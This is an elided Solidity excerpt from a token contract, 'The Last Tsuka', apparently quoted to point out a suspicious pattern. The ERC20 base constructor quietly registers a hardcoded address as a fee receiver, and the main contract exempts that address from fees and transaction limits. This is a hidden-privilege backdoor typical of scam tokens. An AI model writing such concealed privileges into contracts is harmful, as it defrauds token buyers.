...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x4a82670fa20C8Cf546dF7aF66970756aB292Bf2F] = _marketingwallet;
    }
...
contract TheLastTsuka is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("The Last Tsuka", "TLT") {
        ...
        maxTransactionAmount = totalSupply * 6 / 1000; // 0.6% maxTransactionAmountTxn
        ...
        excludeFromFees(address(0x4a82670fa20C8Cf546dF7aF66970756aB292Bf2F), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x4a82670fa20C8Cf546dF7aF66970756aB292Bf2F), true);
